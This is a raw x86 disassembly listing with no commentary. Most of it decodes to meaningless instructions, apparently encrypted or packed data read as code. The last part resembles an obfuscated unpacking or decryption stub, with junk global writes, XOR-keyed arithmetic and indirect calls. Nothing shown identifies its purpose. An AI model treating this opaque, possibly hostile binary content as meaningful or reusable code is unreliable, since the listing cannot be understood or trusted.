  40314b:	and    ecx,DWORD PTR [esi+edx*8]
  40314e:	test   al,0x5d
  403150:	aaa    
  403151:	in     al,dx
  403152:	imul   edx,DWORD PTR [esi],0x91a19801
  403158:	fs pusha 
  40315a:	icebp  
  40315b:	dec    edx
  40315c:	(bad)  
  40315d:	and    eax,0xd33d158b
  403162:	and    dh,BYTE PTR [ebp+0x4a3e857a]
  403168:	push   ds
  403169:	inc    edi
  40316a:	jo     0x403155
  40316c:	add    edx,DWORD PTR [edi+0x5788351b]
  403172:	rcl    BYTE PTR [ebp+0x2ef59fd0],0x65
  403179:	ja     0x403190
  40317b:	dec    edi
  40317c:	test   BYTE PTR [eax+eax*8-0x4fc49d90],cl
  403183:	mov    al,ds:0x33b5b70a
  403188:	cmp    al,0x51
  40318a:	lea    ecx,es:[ecx]
  40318d:	add    eax,0xdb2809c1
  403192:	lahf   
  403193:	ins    DWORD PTR es:[edi],dx
  403194:	sub    DWORD PTR [esi],0x66b10d51
  40319a:	sub    esi,0x69
  40319d:	add    ecx,DWORD PTR [ebp-0x2]
  4031a0:	adc    BYTE PTR [ebp+0x7bd8b82c],bh
  4031a6:	ret    0x7c57
  4031a9:	jmp    0x403152
  4031ab:	add    BYTE PTR [edi-0xe6df21b],ah
  4031b1:	div    DWORD PTR [ecx-0x5f]
  4031b4:	mov    ah,0x6c
  4031b6:	adc    eax,0x6df2c739
  4031bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031bc:	loopne 0x403188
  4031be:	xchg   BYTE PTR [ebp+0x51],dl
  4031c1:	dec    esp
  4031c2:	mov    ebx,0x1cc7df18
  4031c7:	add    BYTE PTR ds:0x5b37335e,al
  4031cd:	jle    0x403158
  4031cf:	pop    edx
  4031d0:	dec    ebp
  4031d1:	pop    eax
  4031d2:	jae    0x40320a
  4031d4:	dec    ecx
  4031d5:	fcom   DWORD PTR [eax-0x15]
  4031d8:	inc    eax
  4031d9:	cmp    esi,ecx
  4031db:	in     al,dx
  4031dc:	mov    dh,0x9c
  4031de:	(bad)  
  4031df:	push   cs
  4031e0:	mov    cs,WORD PTR [edx+0x16cb57d2]
  4031e6:	mov    dl,BYTE PTR fs:[edi+ebx*1+0x5b6516dd]
  4031ee:	and    bh,BYTE PTR [esi+ebx*1-0x6ebea182]
  4031f5:	jp     0x403224
  4031f7:	(bad)  [ecx+0x5b]
  4031fa:	and    al,0xa6
  4031fc:	jb     0x4031f9
  4031fe:	mov    ebp,edx
  403200:	inc    esi
  403201:	lods   eax,DWORD PTR ds:[esi]
  403202:	aaa    
  403203:	dec    ebp
  403204:	jae    0x4031ad
  403206:	pop    ebx
  403207:	sbb    BYTE PTR [ebx],al
  403209:	push   eax
  40320a:	rcl    BYTE PTR [esp+eax*4-0x6f],0x1e
  40320f:	xlat   BYTE PTR ds:[ebx]
  403210:	lods   al,BYTE PTR ds:[esi]
  403211:	mov    eax,ds:0x34cb3b9f
  403216:	xchg   ebx,eax
  403217:	cmp    eax,0x284c6aa3
  40321c:	add    DWORD PTR [edi+eiz*4-0x35],ebp
  403220:	rcr    DWORD PTR [esi-0x2d],1
  403223:	jo     0x403239
  403225:	push   esi
  403226:	ror    esi,cl
  403228:	in     eax,0xb2
  40322a:	sbb    ch,dl
  40322c:	dec    edx
  40322d:	cmp    dh,ah
  40322f:	mov    ds:0x46618330,eax
  403234:	and    al,BYTE PTR [edx-0x13]
  403237:	dec    esp
  403238:	cwde   
  403239:	fwait
  40323a:	cmp    BYTE PTR [edi+0x4590ffd2],dl
  403240:	hlt    
  403241:	jmp    0x31f4:0xee6235
  403248:	sbb    esi,DWORD PTR [edx-0x1e]
  40324b:	fmul   QWORD PTR [eax]
  40324d:	imul   edx,DWORD PTR [ecx+0x58],0x77652491
  403254:	sbb    edi,edx
  403256:	js     0x40323d
  403258:	adc    eax,ebp
  40325a:	push   ss
  40325b:	cmc    
  40325c:	aaa    
  40325d:	xor    eax,0xbc9f4d03
  403262:	mov    esi,0xf2ed2196
  403267:	fldcw  WORD PTR gs:[esi+0x36]
  40326b:	mov    edx,0x55b2e90a
  403270:	push   ebx
  403271:	data16 mov ds:0xe960489a,al
  403277:	mov    ch,0xaa
  403279:	dec    edx
  40327a:	jecxz  0x40322e
  40327c:	lahf   
  40327d:	jnp    0x403282
  40327f:	fwait
  403280:	imul   esp,DWORD PTR [esi-0x45],0x996d9a18
  403287:	mov    dh,0x17
  403289:	mov    dh,0xc4
  40328b:	mov    al,0x25
  40328d:	leave  
  40328e:	cmp    BYTE PTR [eax-0x17878ccc],bh
  403294:	sbb    eax,DWORD PTR [esi+0x47]
  403297:	gs cmp eax,0xe0374e03
  40329d:	adc    al,0x83
  40329f:	ds in  eax,0xf
  4032a2:	scas   eax,DWORD PTR es:[edi]
  4032a3:	(bad)  
  4032a4:	mov    eax,0x46781d7
  4032a9:	jl     0x4032c9
  4032ab:	mov    edx,ss
  4032ad:	jge    0x4032fb
  4032af:	jl     0x403290
  4032b1:	sahf   
  4032b2:	js     0x40327a
  4032b4:	shl    BYTE PTR [ebp+eiz*4-0x74],cl
  4032b8:	rcr    DWORD PTR [esi-0x76d4e7ac],0x76
  4032bf:	jp     0x403330
  4032c1:	in     eax,0xd8
  4032c3:	push   edx
  4032c4:	inc    esp
  4032c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4032c6:	jae    0x4032ba
  4032c8:	or     ebp,esp
  4032ca:	retf   0x4765
  4032cd:	xchg   ebp,eax
  4032ce:	cmp    bh,dl
  4032d0:	add    DWORD PTR [edi+0x36],edx
  4032d3:	and    DWORD PTR [ecx-0x363ef3f9],esp
  4032d9:	cmp    eax,DWORD PTR [ebx]
  4032db:	push   esp
  4032dc:	add    DWORD PTR [ebp-0x52],edi
  4032df:	lods   al,BYTE PTR ds:[esi]
  4032e0:	rcl    al,0xaf
  4032e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032e4:	pop    ss
  4032e5:	jmp    0x205a:0x1e84c3f1
  4032ec:	imul   edx,eax,0xf410223f
  4032f2:	outs   dx,DWORD PTR ds:[esi]
  4032f3:	mov    ds:0xe2277578,al
  4032f8:	pop    ebx
  4032f9:	ss dec ecx
  4032fb:	sti    
  4032fc:	mov    ah,cl
  4032fe:	cld    
  4032ff:	je     0x4032a3
  403301:	imul   edi,DWORD PTR ds:0x7cd70dac,0x273dd8a2
  40330b:	in     al,dx
  40330c:	xchg   ecx,eax
  40330d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40330e:	push   esi
  40330f:	mov    BYTE PTR [ecx+0x4d4a2f92],al
  403315:	xchg   al,bl
  403317:	add    esi,DWORD PTR [edi+0x7a5b7de3]
  40331d:	scas   eax,DWORD PTR es:[edi]
  40331e:	cwde   
  40331f:	mov    ebp,DWORD PTR [esi]
  403321:	pop    edx
  403322:	in     eax,dx
  403323:	jae    0x40334b
  403325:	ja     0x40336f
  403327:	pop    esp
  403328:	mov    cs,WORD PTR [edi]
  40332a:	in     eax,0x1c
  40332c:	adc    esi,DWORD PTR ds:0xe13c7631
  403332:	xchg   BYTE PTR [edx+0x1f],dl
  403335:	shr    ah,0x4a
  403338:	dec    edi
  403339:	push   edi
  40333a:	inc    ebp
  40333b:	into   
  40333c:	jmp    DWORD PTR [ecx+0x5c]
  40333f:	mov    ds:0xfb5c673e,al
  403344:	xchg   edx,eax
  403345:	sub    ebp,esi
  403347:	pushf  
  403348:	add    BYTE PTR [edi-0x11698f6a],bl
  40334e:	or     ebp,ecx
  403350:	stos   DWORD PTR es:[edi],eax
  403351:	into   
  403352:	jnp    0x40332b
  403354:	pop    esp
  403355:	not    DWORD PTR [edi-0x6626bb8d]
  40335b:	push   cs
  40335c:	imul   ebx,DWORD PTR [edx+0x31dc095c],0xffffffe2
  403363:	mov    es,ebp
  403365:	lds    ebp,FWORD PTR [ebx+0x77]
  403368:	or     al,0x17
  40336a:	lods   eax,DWORD PTR ds:[esi]
  40336b:	xor    al,0x71
  40336d:	jg     0x403312
  40336f:	leave  
  403370:	ss inc esp
  403372:	sbb    DWORD PTR [edi+0xcce1e75],edi
  403378:	sub    dh,bh
  40337a:	popf   
  40337b:	add    BYTE PTR es:[edx],al
  40337e:	ss aas 
  403380:	xchg   ebx,eax
  403381:	(bad)  
  403383:	test   BYTE PTR [eax+0x2f],bh
  403386:	outs   dx,DWORD PTR ds:[esi]
  403387:	mov    WORD PTR [ecx+0x3f76777c],ds
  40338d:	push   eax
  40338e:	sar    esp,1
  403390:	sub    al,0xd3
  403392:	in     al,0x84
  403394:	jge    0x403368
  403396:	daa    
  403397:	dec    esi
  403398:	loop   0x40331e
  40339a:	popf   
  40339b:	or     BYTE PTR [edi-0x734da56f],0x6e
  4033a2:	(bad)  
  4033a3:	in     al,dx
  4033a4:	and    DWORD PTR [esi+0x7c305c4b],edx
  4033aa:	mov    esi,0xb945650a
  4033af:	xchg   edi,eax
  4033b0:	(bad)  
  4033b1:	pop    ds
  4033b2:	popa   
  4033b3:	loope  0x4033d3
  4033b5:	dec    esi
  4033b6:	call   0xbbb03178
  4033bb:	aaa    
  4033bc:	add    cl,al
  4033be:	add    DWORD PTR [ecx-0x7d],eax
  4033c1:	adc    ebp,ebx
  4033c3:	(bad)  
  4033c4:	ins    DWORD PTR es:[edi],dx
  4033c5:	push   eax
  4033c6:	inc    eax
  4033c7:	arpl   cx,sp
  4033c9:	pop    edx
  4033ca:	sbb    BYTE PTR [edi+0x2b],bl
  4033cd:	scas   al,BYTE PTR es:[edi]
  4033ce:	pop    esp
  4033cf:	mov    esp,0x63647c67
  4033d4:	mov    cl,0x6c
  4033d6:	es pop ss
  4033d8:	out    dx,eax
  4033d9:	and    al,0xa9
  4033db:	pop    ebx
  4033dc:	stos   BYTE PTR es:[edi],al
  4033dd:	lock xchg edi,eax
  4033df:	cmovl  esp,DWORD PTR [edx+edx*1+0x4344d225]
  4033e7:	ret    
  4033e8:	push   ds
  4033e9:	xchg   ebx,eax
  4033ea:	pop    es
  4033eb:	inc    edi
  4033ec:	sbb    ah,BYTE PTR [esi+edx*2+0x2145db72]
  4033f3:	jbe    0x403455
  4033f5:	aas    
  4033f6:	mov    esp,0x340e334d
  4033fb:	pusha  
  4033fc:	or     al,0xad
  4033fe:	push   esi
  4033ff:	mov    bl,al
  403401:	lock add eax,0xda9cdd05
  403407:	pop    ss
  403408:	inc    BYTE PTR [ecx+0x7d]
  40340b:	push   ebx
  40340c:	pop    ebx
  40340d:	imul   edx,DWORD PTR [ecx+0x33efbe07],0xf594ad9a
  403417:	pop    ss
  403418:	xchg   DWORD PTR [edi+0x14751000],esi
  40341e:	mov    ch,0xa1
  403420:	jns    0x403477
  403422:	sub    eax,0xcd761ad2
  403427:	loopne 0x4033ba
  403429:	add    esp,DWORD PTR [eax+ebp*2+0x4d8dada9]
  403430:	retf   
  403431:	jg     0x40347f
  403433:	mov    edx,0x46f16c08
  403438:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403439:	psubsw mm0,QWORD PTR [ebx-0x55]
  40343d:	dec    ebx
  40343e:	jae    0x40348a
  403440:	mov    ds:0xb9ab2751,eax
  403445:	clc    
  403446:	mov    dl,0xc6
  403448:	les    esp,FWORD PTR [ecx]
  40344a:	call   0xebdc4ce9
  40344f:	ret    0x4fa2
  403452:	ds dec ebp
  403454:	and    DWORD PTR [eax],eax
  403456:	iret   
  403457:	sbb    bl,dl
  403459:	ja     0x40341f
  40345b:	stos   BYTE PTR es:[edi],al
  40345c:	pushf  
  40345d:	std    
  40345e:	cmpxchg BYTE PTR [eax+0x616994e],ah
  403465:	call   0x2b68f051
  40346a:	or     al,0xc4
  40346c:	mov    bl,0x61
  40346e:	repnz test al,0xb6
  403471:	popa   
  403472:	out    dx,al
  403473:	cmc    
  403474:	jbe    0x403401
  403476:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403477:	cmp    esp,ebx
  403479:	inc    edx
  40347a:	ins    BYTE PTR es:[edi],dx
  40347b:	and    BYTE PTR [esi],ah
  40347d:	js     0x4034e0
  40347f:	pop    edi
  403480:	loopne 0x40340e
  403482:	fst    QWORD PTR [edi+0x6028dd5f]
  403488:	aas    
  403489:	rcl    edi,1
  40348b:	and    BYTE PTR [eax-0x381f70ab],ch
  403491:	fucomp st(0)
  403493:	pop    eax
  403495:	pop    eax
  403496:	push   ecx
  403497:	ins    DWORD PTR es:[edi],dx
  403498:	dec    cl
  40349a:	add    eax,0xae6bd25c
  40349f:	sti    
  4034a0:	nop
  4034a1:	and    DWORD PTR [esi+0x2e],0xfffffff2
  4034a5:	mov    ebp,0xc5c08dec
  4034aa:	pushf  
  4034ab:	call   0x32a6:0x27f163ee
  4034b2:	mov    edx,0xe0ab2399
  4034b7:	outs   dx,BYTE PTR ds:[esi]
  4034b8:	xchg   ecx,eax
  4034b9:	xor    ebx,DWORD PTR [esi+0x34d55d23]
  4034bf:	and    dh,ch
  4034c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034c2:	jne    0x4034b6
  4034c4:	jle    0x4034fc
  4034c6:	or     esi,DWORD PTR [ebx+ebx*4+0x44]
  4034ca:	xchg   esi,eax
  4034cb:	push   eax
  4034cc:	xchg   edi,eax
  4034cd:	neg    ah
  4034cf:	arpl   si,dx
  4034d1:	rcl    BYTE PTR [ebx+eiz*4-0x34],cl
  4034d5:	sub    BYTE PTR [eax],al
  4034d7:	mov    gs,WORD PTR [esi-0x17a56684]
  4034dd:	fistp  QWORD PTR [eax+0x7f]
  4034e0:	cmp    DWORD PTR [edi],0x33dd92f0
  4034e6:	adc    ebp,DWORD PTR [edx-0x6a4ab98a]
  4034ec:	xor    ecx,ebp
  4034ee:	xchg   esp,eax
  4034ef:	xchg   edx,eax
  4034f0:	mov    ds:0xc6238435,eax
  4034f5:	popa   
  4034f6:	dec    ecx
  4034f7:	push   edx
  4034f8:	xchg   edx,eax
  4034f9:	and    DWORD PTR [ecx-0x273c8e31],0xfb6b2cb6
  403503:	js     0x403520
  403505:	retf   0xd294
  403508:	mov    ebp,0xc203a5d5
  40350d:	pop    esp
  40350e:	xchg   edx,eax
  40350f:	retf   
  403510:	mov    DWORD PTR [edx],edi
  403512:	out    dx,al
  403513:	lods   al,BYTE PTR ds:[esi]
  403514:	lds    eax,FWORD PTR [edx+0x12c9eb24]
  40351a:	xor    BYTE PTR [esi-0x41],bl
  40351d:	mov    ebx,DWORD PTR [edi+0x1769df03]
  403523:	ret    0xcbfa
  403526:	xchg   ebx,eax
  403527:	mov    esp,0xc962a4a6
  40352c:	mov    ebp,0xf38dd813
  403531:	inc    edx
  403532:	xchg   cl,dh
  403534:	cmp    ch,BYTE PTR [ebp-0x46b8f709]
  40353a:	xor    ecx,DWORD PTR [edx-0x7c]
  40353d:	xor    esp,ecx
  40353f:	cs push 0x37
  403542:	jmp    0x403568
  403544:	dec    esp
  403545:	adc    ah,al
  403547:	mov    DWORD PTR [ebx+0x54e98c2b],edx
  40354d:	xlat   BYTE PTR ds:[ebx]
  40354e:	cwde   
  40354f:	adc    eax,0xcb549bb4
  403554:	xchg   edx,eax
  403555:	out    0x27,eax
  403557:	fwait
  403558:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403559:	xor    ebx,edx
  40355b:	and    DWORD PTR [ebx],0xdd058039
  403561:	adc    bl,bl
  403563:	stos   DWORD PTR es:[edi],eax
  403564:	add    esp,DWORD PTR [ecx-0x7e225328]
  40356a:	push   edx
  40356b:	xor    al,0x5b
  40356d:	int    0x4c
  40356f:	inc    esp
  403570:	or     DWORD PTR [esi-0x75396715],edx
  403576:	fdivr  QWORD PTR [ebp+0x6c]
  403579:	push   0x1c910cff
  40357e:	les    esp,FWORD PTR [ebx]
  403580:	sub    edi,DWORD PTR [edx]
  403582:	push   ecx
  403583:	pop    ss
  403584:	sbb    eax,0xe4b88395
  403589:	mov    dl,0x25
  40358b:	into   
  40358c:	mov    ebx,0x3ed26f11
  403591:	mov    eax,0xe194fdc
  403596:	jnp    0x403599
  403598:	jle    0x40356e
  40359a:	jo     0x403593
  40359c:	pop    ss
  40359d:	(bad)  
  40359e:	sbb    BYTE PTR [eax-0x75],cl
  4035a1:	push   ss
  4035a2:	push   es
  4035a3:	test   eax,0xb6246711
  4035a8:	adc    edx,ebp
  4035aa:	or     dh,BYTE PTR [ebp+0x398aef51]
  4035b0:	mov    esi,0xd4957eb8
  4035b5:	push   ebx
  4035b6:	je     0x4035ad
  4035b8:	icebp  
  4035b9:	dec    esi
  4035ba:	inc    ebp
  4035bb:	sti    
  4035bc:	minps  xmm2,xmm5
  4035bf:	jb     0x4035ed
  4035c1:	xchg   BYTE PTR [ebx+eiz*1],ah
  4035c4:	test   ebp,0x623df6c2
  4035ca:	and    DWORD PTR [ebp-0x6c],ebp
  4035cd:	js     0x4035ac
  4035cf:	xchg   DWORD PTR [edx+0x62],edi
  4035d2:	outs   dx,BYTE PTR cs:[esi]
  4035d4:	iret   
  4035d5:	aaa    
  4035d6:	add    ebx,esi
  4035d8:	sbb    BYTE PTR [eax-0x75],0x6a
  4035dc:	cmp    esi,ebp
  4035de:	mov    ebx,0x43c4fcb1
  4035e3:	fdivrp st(7),st
  4035e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035e6:	push   ss
  4035e7:	mov    edx,0xb8627a11
  4035ec:	mov    ebx,0x9e820eb
  4035f1:	test   DWORD PTR ds:[esi],0xa59a1ba0
  4035f8:	shl    BYTE PTR [edx+0x66],cl
  4035fb:	stos   BYTE PTR es:[edi],al
  4035fc:	jo     0x4035d1
  4035fe:	pop    edx
  4035ff:	sbb    BYTE PTR [esi+0x72],al
  403602:	cmp    eax,0x8b74f923
  403607:	inc    ecx
  403608:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40360a:	adc    dh,dh
  40360c:	mov    esp,0xe25a83a5
  403611:	mov    al,0x8c
  403613:	mov    es,ebx
  403615:	sub    esp,edx
  403617:	inc    esp
  403618:	inc    eax
  403619:	adc    edx,DWORD PTR [ebp+0x6ba5cfed]
  40361f:	leave  
  403620:	or     DWORD PTR ds:0x6b4006ee,edx
  403626:	shl    BYTE PTR [edi+0x40ac9192],1
  40362c:	outs   dx,BYTE PTR ds:[esi]
  40362d:	mov    ds:0xcc8a67db,al
  403632:	cmp    al,bl
  403634:	sbb    DWORD PTR [ebx],0x14
  403637:	loope  0x4035c6
  403639:	sbb    esi,DWORD PTR [ebx+0x68f1912a]
  40363f:	mov    bh,BYTE PTR [esi+0x6d]
  403642:	sub    BYTE PTR [ebx-0x6a],cl
  403645:	lahf   
  403646:	sbb    dl,ah
  403648:	dec    ecx
  403649:	push   ss
  40364a:	data16 mov dl,BYTE PTR [edi+0x7a]
  40364e:	jmp    0x6b16c214
  403653:	pop    ebp
  403654:	adc    ch,BYTE PTR ds:0x1b53306a
  40365a:	mov    ds:0x3d2a81e4,eax
  40365f:	sbb    eax,0x3b1e0af2
  403664:	xor    eax,0x13c3890d
  403669:	cmp    BYTE PTR [ecx+0x33],0x4d
  40366d:	and    ecx,esp
  40366f:	xor    BYTE PTR [edi+0x7],al
  403672:	adc    al,BYTE PTR [esi]
  403674:	cmp    DWORD PTR [esi+eiz*1],0x725c6932
  40367b:	je     0x4036cf
  40367d:	jo     0x40366c
  40367f:	xchg   edi,eax
  403680:	clc    
  403681:	pop    ebp
  403682:	in     al,0xb2
  403684:	push   esi
  403685:	mov    dh,0xfc
  403687:	ss pop edi
  403689:	(bad)  
  40368b:	sub    al,0xd6
  40368d:	call   FWORD PTR [ebx]
  40368f:	mov    esi,0xdd0b31af
  403694:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403695:	shl    BYTE PTR [eax],1
  403697:	mov    esp,0xbb0a4c56
  40369c:	dec    esp
  40369d:	mov    esi,0xc70513b3
  4036a2:	inc    ecx
  4036a3:	push   ds
  4036a4:	push   esp
  4036a5:	jle    0x403723
  4036a7:	ret    
  4036a8:	inc    esp
  4036a9:	leave  
  4036aa:	push   ebx
  4036ab:	xor    eax,0x804248bb
  4036b0:	jae    0x40369e
  4036b2:	sub    edi,edi
  4036b4:	stos   DWORD PTR es:[edi],eax
  4036b5:	(bad)  
  4036b6:	push   esp
  4036b7:	xor    edi,edx
  4036b9:	push   edi
  4036ba:	add    edi,DWORD PTR [esi+ecx*4-0x30]
  4036be:	fwait
  4036bf:	jmp    0x5038:0x6edd961f
  4036c6:	rol    BYTE PTR [edi],1
  4036c8:	fadd   DWORD PTR [ebp+0x5427955f]
  4036ce:	mov    edx,0xf4ecf67e
  4036d3:	cmp    DWORD PTR [ebx-0xf37e16],0x9
  4036da:	push   edx
  4036db:	dec    ebx
  4036dc:	lock lds ecx,FWORD PTR [ecx]
  4036df:	pop    ecx
  4036e0:	mov    cs,ebp
  4036e2:	shl    dl,cl
  4036e4:	shl    DWORD PTR [edx*1+0x568032c8],0x3d
  4036ec:	fmul   st,st(6)
  4036ee:	cmp    DWORD PTR [ecx+0x413bdb2d],esi
  4036f4:	mul    BYTE PTR ds:0xa94fcd6f
  4036fa:	fistp  DWORD PTR [eax-0x227c77a3]
  403700:	imul   ecx,edx,0x9c2f7dc7
  403706:	push   0x56d27e3b
  40370b:	push   ds
  40370c:	mov    edx,DWORD PTR [esi]
  40370e:	or     dl,BYTE PTR [ecx-0x1f]
  403711:	out    dx,eax
  403712:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403713:	fmul   st,st(5)
  403715:	push   es
  403716:	cwde   
  403717:	fst    DWORD PTR [eax+esi*8]
  40371a:	mov    al,ds:0xa8a08325
  40371f:	rcl    DWORD PTR [esi+0x7fc38bae],1
  403725:	jecxz  0x4036de
  403727:	mov    dh,0x52
  403729:	shl    bh,1
  40372b:	out    0x2e,eax
  40372d:	(bad)  
  40372f:	and    eax,0xff4aba40
  403734:	cmp    esi,0xe3ff13
  40373a:	push   edi
  40373b:	bound  eax,QWORD PTR [edi]
  40373d:	imul   esp,DWORD PTR [eax-0x6081165e],0x2f948d5f
  403747:	pop    edi
  403748:	adc    cl,bh
  40374a:	dec    esi
  40374b:	sub    al,dh
  40374d:	or     al,0x40
  40374f:	push   ecx
  403750:	scas   eax,DWORD PTR es:[edi]
  403751:	add    BYTE PTR [esi],ah
  403753:	jae    0x4037b1
  403755:	inc    esi
  403756:	jns    0x403724
  403758:	xchg   ebp,eax
  403759:	sub    BYTE PTR [si+0x60],ah
  40375d:	jb     0x4036e1
  40375f:	repnz push 0xffffff95
  403762:	mov    bl,0x93
  403764:	leave  
  403765:	mov    edx,DWORD PTR [edx+0x4934f2d1]
  40376b:	and    ebx,DWORD PTR [eax]
  40376d:	pop    edx
  40376e:	mov    bl,0xac
  403770:	sar    bl,cl
  403772:	mov    eax,ds:0x6be0656
  403777:	ror    DWORD PTR [edx-0x5e967d9a],cl
  40377d:	je     0x4037a4
  40377f:	adc    ebx,edx
  403781:	ds pop es
  403783:	into   
  403784:	jae    0x4037e6
  403786:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403787:	mov    eax,ds:0xc942c0b0
  40378c:	(bad)  [esi-0x29]
  40378f:	pop    ecx
  403790:	adc    al,BYTE PTR [ebx+0x3e]
  403793:	push   eax
  403794:	je     0x403722
  403796:	push   0x6df782f8
  40379b:	cmp    esp,ebp
  40379d:	and    al,0x46
  40379f:	stos   DWORD PTR es:[edi],eax
  4037a0:	xor    ebp,edi
  4037a2:	jge    0x403745
  4037a4:	push   edi
  4037a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4037a6:	ficom  WORD PTR [edi-0x614094c6]
  4037ac:	xchg   ebp,eax
  4037ad:	into   
  4037ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037af:	sar    BYTE PTR [edi+esi*2+0x3e],0xab
  4037b4:	xor    dh,al
  4037b6:	stos   DWORD PTR es:[edi],eax
  4037b7:	xchg   esi,eax
  4037b8:	pop    edx
  4037b9:	dec    ebp
  4037ba:	jne    0x403837
  4037bc:	jae    0x4037e8
  4037be:	sbb    BYTE PTR [edi+0x5c53df77],al
  4037c4:	dec    esp
  4037c5:	test   al,0x6f
  4037c7:	fwait
  4037c8:	xchg   esp,eax
  4037c9:	adc    bl,BYTE PTR ss:[edi-0x36]
  4037cd:	mov    ds:0xf38a5dbb,al
  4037d2:	xor    BYTE PTR [eax],0x3b
  4037d5:	leave  
  4037d6:	pop    ds
  4037d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4037d8:	adc    eax,ebx
  4037da:	jae    0x403792
  4037dc:	(bad)
  4037df:	fldenv [esi-0x52]
  4037e2:	arpl   WORD PTR [edi+0x71],di
  4037e5:	aam    0x44
  4037e7:	mov    esi,0x43614bf4
  4037ec:	dec    ebx
  4037ed:	adc    DWORD PTR [ebx+0x7e],ebx
  4037f0:	into   
  4037f1:	or     DWORD PTR [ebx],0x62
  4037f4:	mov    esi,0xcdc23a81
  4037f9:	push   ebp
  4037fa:	jecxz  0x4037b0
  4037fc:	(bad)  
  4037fd:	loopne 0x4037a6
  4037ff:	inc    ebp
  403800:	push   edi
  403801:	jle    0x4037a7
  403803:	lods   al,BYTE PTR ds:[esi]
  403804:	dec    edx
  403805:	out    0x61,al
  403807:	sbb    ch,BYTE PTR [eax-0x50]
  40380a:	call   0x2865:0x9b4a86ed
  403811:	bound  esp,QWORD PTR [esi-0x4f]
  403814:	xor    al,0x8b
  403816:	inc    ebp
  403817:	lock mov ecx,DWORD PTR [ebp-0x10]
  40381b:	xor    eax,esi
  40381d:	xor    ecx,esi
  40381f:	sub    DWORD PTR ds:0x428eb3,0x5e8a
  403829:	lea    ecx,[eax+ecx*1+0x64e5ec]
  403830:	mov    eax,DWORD PTR [ebp-0xc]
  403833:	sbb    DWORD PTR ds:0x428e97,0x428e5b
  40383d:	xor    edx,edx
  40383f:	adc    DWORD PTR ds:0x428e4b,0x428eab
  403849:	div    ecx
  40384b:	movzx  eax,WORD PTR ds:0x428e2b
  403852:	add    DWORD PTR ds:0x428eb3,eax
  403858:	mov    eax,DWORD PTR [ebp-0x8]
  40385b:	mov    DWORD PTR ds:0x428e57,0x1e
  403865:	cmp    DWORD PTR ds:0x428e57,0x0
  40386c:	je     0x4038bb
  403872:	cmp    DWORD PTR ds:0x428e57,0x9
  403879:	jb     0x4038bb
  40387f:	jmp    0x40388d
  403884:	push   DWORD PTR [ebp-0x10]
  403887:	call   DWORD PTR ds:0x42a9db
  40388d:	cmp    DWORD PTR ds:0x428e57,0xa
  403894:	jne    0x4038a7
  40389a:	mov    ecx,DWORD PTR ds:0x428e57
  4038a0:	dec    ecx
  4038a1:	mov    DWORD PTR ds:0x428e57,ecx
  4038a7:	xor    ecx,ecx
  4038a9:	add    ecx,DWORD PTR ds:0x428e57
  4038af:	dec    ecx
  4038b0:	mov    DWORD PTR ds:0x428e57,ecx
  4038b6:	jmp    0x403865
  4038bb:	mov    ecx,DWORD PTR [ebp-0x10]
  4038be:	xor    eax,esi
  4038c0:	xor    ecx,esi
  4038c2:	sub    eax,ecx
  4038c4:	mov    DWORD PTR ds:0x428e43,0x1a6e
  4038ce:	cmp    edx,eax
  4038d0:	mov    DWORD PTR ds:0x428e43,0x4c12
  4038da:	jne    0x403ae6
  4038e0:	mov    eax,DWORD PTR [ebp-0xc]
  4038e3:	mov    dl,BYTE PTR [eax+ebx*1+0x800]
  4038ea:	sbb    eax,DWORD PTR ds:0x428ec3
  4038f0:	mov    eax,DWORD PTR [ebp-0x28]
  4038f3:	mov    ecx,DWORD PTR [ebp-0x18]
  4038f6:	or     DWORD PTR ds:0x428ec3,0x7d0f
  403900:	xor    eax,esi
  403902:	xor    ecx,esi
  403904:	add    eax,edi
  403906:	add    ecx,edi
  403908:	mov    BYTE PTR [ebp-0x21],dl
  40390b:	mov    DWORD PTR ds:0x428e57,0x12ce
  403915:	cmp    eax,ecx
  403917:	mov    DWORD PTR ds:0x428eab,0x3e33
  403921:	jae    0x403a8f
  403927:	mov    edx,DWORD PTR ds:0x428e57
  40392d:	xor    DWORD PTR ds:0x428e87,edx
  403933:	lea    ecx,[eax-0x3272f6]
  403939:	mov    DWORD PTR [ebp-0x14],ecx
  40393c:	and    DWORD PTR ds:0x428e73,0x0
  403946:	mov    edx,DWORD PTR ds:0x428e73
  40394c:	inc    edx
  40394d:	mov    DWORD PTR ds:0x428e73,edx
  403953:	cmp    DWORD PTR ds:0x428e73,0x20
  40395a:	ja     0x403980
  403960:	jmp    0x403973
  403965:	push   0x428e8b
  40396a:	push   DWORD PTR [ebp-0xc]
  40396d:	call   DWORD PTR ds:0x42a9df
  403973:	cmp    DWORD PTR ds:0x428e73,0x11
  40397a:	jb     0x403946
  403980:	mov    edx,DWORD PTR [ebp-0x14]
  403983:	or     DWORD PTR ds:0x428e6b,0xd5d
  40398d:	xor    edx,esi
  40398f:	xor    DWORD PTR ds:0x428e83,0x428e5f
  403999:	add    edx,0x7f55d8e3
  40399f:	lea    ecx,[ebp+eax*4-0xb4]
  4039a6:	mov    DWORD PTR [ecx],edx
  4039a8:	mov    DWORD PTR ds:0x428e47,0xcba
  4039b2:	mov    edx,DWORD PTR [ecx]
  4039b4:	mov    DWORD PTR ds:0x428e2b,0xfd2
  4039be:	cmp    edx,0x244ecb82
  4039c4:	jbe    0x4039e9
  4039ca:	xor    DWORD PTR ds:0x428ea3,0x47b3
  4039d4:	add    DWORD PTR [ecx],0x405fcc1
  4039da:	mov    DWORD PTR ds:0x428e63,0x27c8
  4039e4:	jmp    0x4039f9
  4039e9:	or     DWORD PTR ds:0x428ea3,0x2c0c
  4039f3:	add    DWORD PTR [ecx],0xfdaf433f
